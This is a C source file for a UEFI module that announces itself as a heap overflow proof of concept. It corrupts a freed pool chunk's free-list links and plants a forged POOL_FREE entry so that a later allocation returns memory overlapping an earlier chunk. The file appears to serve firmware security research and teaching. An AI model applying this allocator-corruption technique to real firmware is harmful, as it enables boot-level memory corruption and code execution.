#include <Library/DebugLib.h>
#include <Library/BaseLib.h>
#include <Library/PrintLib.h>
#include <Library/UefiBootServicesTableLib.h>
#include <Library/UefiRuntimeLib.h>
#include <Library/UefiRuntimeServicesTableLib.h>
#include <Uefi.h>

#define SIGNATURE_16(A, B)  ((A) | (B << 8))

#define SIGNATURE_32(A, B, C, D)  (SIGNATURE_16 (A, B) | (SIGNATURE_16 (C, D) << 16))

#define POOL_FREE_SIGNATURE  SIGNATURE_32('p','f','r','0')

typedef struct {
  UINT32      Signature;
  UINT32      Index;
  LIST_ENTRY  Link;
} POOL_FREE;

VOID
EFIAPI
ReportPrint (
  IN CONST CHAR8  *Format,
  ...
  )
{
  VA_LIST  Marker;
  CHAR16   String[256];
  UINTN    Length;

  VA_START (Marker, Format);
  Length = UnicodeVSPrintAsciiFormat (String, sizeof (String), Format, Marker);
  if (Length == 0) {
    DEBUG ((DEBUG_ERROR, "%a formatted string is too long\n", __FUNCTION__));
  } else {
    gST->ConOut->OutputString (gST->ConOut, String);
  }

  VA_END (Marker);
}

EFI_STATUS
EFIAPI
HeapTestEntryPoint(IN EFI_HANDLE ImageHandle,
                   IN EFI_SYSTEM_TABLE *SystemTable) {
  EFI_STATUS Status = EFI_SUCCESS;
  UINT64** first_chunk;
  UINT64** second_chunk;
  UINT64** temp_chunk;
  UINT64** third_chunk;
  POOL_FREE* fake_chunk;

  gST->ConOut->ClearScreen(gST->ConOut);
  gST->ConOut->SetCursorPosition(gST->ConOut, 10, 10);
  gST->ConOut->SetAttribute(gST->ConOut, EFI_GREEN);
  gST->ConOut->OutputString(gST->ConOut,
                            L"A Heap Overflow PoC module has been loaded\r\n");

  gST->ConOut->SetAttribute(gST->ConOut, EFI_WHITE);

  Status = gBS->AllocatePool(EfiBootServicesData, 768, (VOID **)&first_chunk);
  gBS->AllocatePool(EfiBootServicesData, 768, (VOID **)&second_chunk);
  ReportPrint("%s %p\n", L"Address of the first chunk:", first_chunk);
  ReportPrint("%s %p\n", L"Address of the second chunk:", second_chunk);

  temp_chunk = (UINT64**)second_chunk - 2;
  gBS->FreePool(second_chunk); // Now we free the second chunk and corrupt it's structure
  fake_chunk = (POOL_FREE*)first_chunk; // We also should create a fake chunk inside some user-controllable place in memory (unprivileged memory for instance)
  fake_chunk->Signature = POOL_FREE_SIGNATURE;
  fake_chunk->Link.ForwardLink = (LIST_ENTRY*)temp_chunk[0];
  fake_chunk->Link.BackLink = (LIST_ENTRY*)temp_chunk;

  temp_chunk[0] = (UINT64*)(&fake_chunk->Link);
  gBS->AllocatePool(EfiBootServicesData, 768, (VOID **)&second_chunk);
  ReportPrint("%s %p\n", L"AllocatePool(768) =", second_chunk);
  gBS->AllocatePool(EfiBootServicesData, 768, (VOID **)&third_chunk);
  ReportPrint("%s %p %s %p %s\n", L"AllocatePool(768) =", third_chunk, L"==", first_chunk, L"+ 18");
  ASSERT(third_chunk-3 == first_chunk);
  return Status;
}

EFI_STATUS
EFIAPI
HeapTestUnload(IN EFI_HANDLE ImageHandle) { return EFI_SUCCESS; }